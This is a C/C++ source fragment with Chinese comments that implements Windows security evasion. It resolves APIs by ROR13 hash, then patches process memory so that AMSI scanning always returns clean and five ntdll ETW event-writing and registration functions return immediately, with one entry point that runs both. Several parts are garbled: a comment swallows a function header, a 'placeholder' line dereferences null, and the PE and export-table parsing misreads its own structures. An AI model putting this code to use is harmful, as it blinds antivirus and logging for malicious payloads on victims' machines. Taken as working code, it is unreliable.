static inline uint32_t h_ror13(const char* s) {
    uint32_t h = 0;
    while (*s) { h = (h >> 13) | (h << 19); h ^= (uint8_t)*s++; }
    return h;
}
static inline uint32_t h_djb2(const char* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) ^ (uint8_t)*s++;
    return h;
}

/* ============ 2. PE 结构解析 ============ */
struct PEView {
    uint8_t* base;
    uint16_t     nt_off;
    uint16_t     nsec;
    uint16_t     opt_size;
    uint32_t     e_lfanew;
    uint16_t* sec;
    const uint8_t* dos;
    uint8_t*     nt;          // IMAGE_NT_HEADERS64
    uint16_t*    dir;
    uint32_t     ndir;
};

inline bool pe_parse(void* base, PEView& v) {
    v.base = (uint8_t*)base;
    v.dos  = (const uint8_t*)base;
    if (v.dos[0] != 'M' || v.dos[1] != 'Z') return false;
    v.e_lfanew = *(uint32_t*)(v.dos + 0x3C);
    v.nt   = v.base + v.e_lfanew;
    if (*(uint32_t*)v.nt != 0x00004550) return false;            // "PE\0\0"
    uint16_t magic = *(uint16_t*)(v.nt + 0x18);
    if (magic != 0x20B) return false;                            // 仅 PE32+
    v.opt_size = *(uint16_t*)(v.nt + 0x14);
    v.nsec   = *(uint16_t*)(v.nt + 0x6);
    v.sec    = (uint16_t*)(v.nt + 0x18 + v.opt_size);
    v.ndir   = *(uint32_t*)(v.nt + 0x18 + 0x6C);
    v.dir    = (uint16_t*)(v.nt + 0x18 + 0x70);
    v.nt_off = (uint16_t)v.e_lfanew;
    return true;
}

/* ============ 3. 导出表按哈希查找 ============ */
static inline uint32_t exp_hash(const char* name) {
    uint32_t h = 0;
    while (*name) { h = (h >> 13) | (h << 19); h ^= (uint8_t)*name++; }
    return h;
}

static void* export_by_hash(void* module, uint32_t target) {
    PEView v;
    if (!pe_parse(module, v)) return nullptr;
    if (v.ndir < 2) return nullptr;

    uint32_t rva   = *(uint32_t*)(v.dir + 0);
    uint32_t size  = *(uint32_t*)(v.dir + 4);
    if (!rva) return nullptr;

    uint8_t* exp = v.base + rva;
    uint32_t nfun = *(uint32_t*)(exp + 0x14);
    uint32_t nnam = *(uint32_t*)(exp + 0x18);
    uint32_t afun = *(uint32_t*)(exp + 0x1C);
    uint32_t anam = *(uint32_t*)(exp + 0x20);
    uint32_t aord = *(uint32_t*)(exp + 0x24);

    uint32_t* ord  = (uint32_t*)(v.base + rva + aord);
    uint32_t* fun  = (uint32_t*)(v.base + rva + afun);
    uint32_t* nam  = (uint32_t*)(v.base + rva + anam);
    (void)size; (void)nnam;

    for (uint32_t i = 0; i < nfun; i++) {
        uint32_t idx = ord[i] & 0xFFFF;
        if (exp_hash((const char*)(v.base + rva + nam[idx])) == target)
            return v.base + fun[idx];
    }
    return nullptr;
}

/* ============ 4. 内存 patch 原语 ============ */
static inline void wbin(void* p, const uint8_t* b, size_t n) {
    memcpy(p, b, n);
    __builtin___clear_cache((char*)p, (char*)p + n);
}

/* 覆写为 N 个 ret。仅本地进程内存，无文件落地。 */
static bool patch_ret(void* fn, size_t n = 6) {
    if (!fn) return false;
    uint8_t  b[16];
    b[0] = 0xC3; for (size_t i = 1; i < n && i < 16; i++) b[i] = 0x90;
    DWORD old = 0;
    if (!VirtualProtect(fn, n, PAGE_EXECUTE_READWRITE, &old)) return false;
    wbin(fn, b, n);
    VirtualProtect(fn, n, old, &old);
    FlushInstructionCache(GetCurrentProcess(), fn, n);
    return true;
}

/* 覆写为 xor eax,eax; ret —— 返回 S_OK(0)，比裸 ret 语义更干净 */
static bool patch_ok(void* fn) {
    const uint8_t b[] = { 0x31, 0xC0, 0xC3, 0x90, 0x90, 0x90, 0x90 };
    DWORD old = 0;
    if (!fn) return false;
    if (!VirtualProtect(fn, sizeof(b), PAGE_EXECUTE_READWRITE, &old)) return false;
    wbin(fn, b, sizeof(b));
    VirtualProtect(fn, sizeof(b), old, &old);
    FlushInstructionCache(GetCurrentProcess(), fn, sizeof(b));
    return true;
}

/* ============ 5. AMSI 关闭 ============ */
// 方案 A：让 AmsiScanBuffer / AmsiScanString 恒返回 S_OK
static bool amsi_neutralize_scan(void) {
    HMODULE a = GetModuleHandleA("amsi.dll");
    if (!a) return true;                       // 未加载即无风险
    bool r1 = patch_ok(export_by_hash(a, exp_hash("AmsiScanBuffer")));
    bool r2 = patch_ok(export_by_hash(a, exp_hash("AmsiScanString")));
    return r1 && r2;
}

// 方案 B：置 AmsiInitFailed = 1，使后续 AmsiInitialize 返回 E_NOTIMPLstatic bool amsi_fail_flag(void) {
    HMODULE a = GetModuleHandleA("amsi.dll");
    if (!a) return true;
    uint8_t* b = (uint8_t*)a;
    uint8_t* e = b + pe_parse(b, *(PEView*)&(*(PEView*)0) ? *(PEView*)0 : *(PEView*)0 ? (PEView*)0 : (PEView*)0) ; // placeholder
    (void)e;
    // 手工遍历 section 找可写段，搜索特征：mov byte [rip+disp],1 紧邻引用 amsi 上下文
    PEView v;
    if (!pe_parse(a, v)) return false;
    for (uint16_t i = 0; i < v.nsec; i++) {
        uint16_t s = v.sec[i];
        uint32_t vs = *(uint32_t*)(s + 8);
        uint32_t va  = *(uint32_t*)(s + 0xC);
        uint32_t rs  = *(uint32_t*)(s + 0x10);
        uint32_t pr  = *(uint32_t*)(s + 0x18);
        if (!(pr & 0x80000000u)) continue;      // IMAGE_SCN_MEM_WRITE
        for (uint32_t off = 0; off < vs && off < rs; off++) {
            uint8_t* p = b + va + off;
            if (p[0] == 0xC6 && p[1] == 0x05) {        // mov byte ptr [rip+disp32], imm8
                int32_t d = *(int32_t*)(p + 2);
                uint8_t* target = p + 7 + d;
                if (target >= b && target < b + vs) { *target = 1; return true; }
            }
        }
    }
    return false;
}

static bool disable_amsi() { return amsi_neutralize_scan() && amsi_fail_flag(); }

/* ============ 6. ETW 关闭 ============ */
// 覆盖三个写入路径 + 注册路径，缺一仍会漏事件
static bool disable_etw(void) {
    HMODULE n = GetModuleHandleA("ntdll.dll");
    if (!n) return false;
    bool ok = true;
    ok &= patch_ret(export_by_hash(n, exp_hash("EtwEventWrite")),     6);
    ok &= patch_ret(export_by_hash(n, exp_hash("EtwEventWriteFull")), 6);
    ok &= patch_ret(export_by_hash(n, exp_hash("EtwEventWriteEx")),   6);
    ok &= patch_ret(export_by_hash(n, exp_hash("EtwNotificationRegister")), 6);
    ok &= patch_ret(export_by_hash(n, exp_hash("EtwNotificationEnable")),   6);
    return ok;
}

/* ============ 7. 一次性入口 ============ */
static bool init_all() {
    disable_amsi();
    disable_etw();
    return true;
}
